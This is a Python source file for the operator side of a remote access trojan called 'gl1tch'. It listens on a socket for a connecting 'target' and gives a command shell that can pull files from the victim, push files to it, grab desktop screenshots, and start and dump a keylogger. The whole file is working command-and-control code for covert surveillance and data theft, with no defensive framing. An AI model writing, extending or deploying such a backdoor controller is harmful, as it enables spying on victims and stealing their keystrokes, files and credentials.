import socket
import json
import termcolor
import os
from art import *


HOST_IP = '127.0.0.1' 
PORT = 5555
def cmd_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def output_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb') # write the file in bytes
    target.settimeout(1) # so that the program wont crash
    chunk = target.recv(1024) # recieving chunks of data
    while chunk: # runs as long as there is data in chunk variable
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None) # removing the settimeout
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())



def target_communication():
    while True:
        command = input(termcolor.colored('#gl1tch> ', 'blue'))
        cmd_send(command)

        if command == ':kill':
            break

        elif command[:3] == 'cd ':
            pass

        elif command == 'help':
            print(termcolor.colored('''   
                            :kill                 ->  exit from shell
                            screenshot            ->  takes screenshot of target desktop
                            download <filename>   ->  recieve file from target
                            upload <filename>     ->  send file to target
                            clear                 ->  clear the shell
                            cd                    ->  change directory
                            keylog start          ->  start keylogger
                            keylog dump           ->  dump keylogger
            ''', 'yellow'))

        elif command == 'clear':
            os.system('clear')

        elif command == 'screenshot':
            download_file('scrn.png')

        elif command[:8] == 'download':
            download_file(command[9:])

        elif command[:6] == 'upload':
            upload_file(command[7:])

        else:
            result = output_recv()
            print(result)



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST_IP, PORT))

print(termcolor.colored('[*] Listening to incoming connections', 'red'))
server.listen(5)

target, ip = server.accept()
print(termcolor.colored('[+] Target connected from ' + str(ip), 'green'))
print('\n')

ascii_art = text2art("gl1tch", "random")
print(ascii_art)
print(termcolor.colored('''   
                    :kill                 ->  exit from shell
                    screenshot            ->  takes screenshot of target desktop
                    download <filename>   ->  recieve file from target
                    upload <filename>     ->  send file to target
                    clear                 ->  clear the shell
                    cd                    ->  change directory
                    keylog start          ->  start keylogger
                    keylog dump           ->  dump keylogger
            ''', 'yellow'))

target_communication()
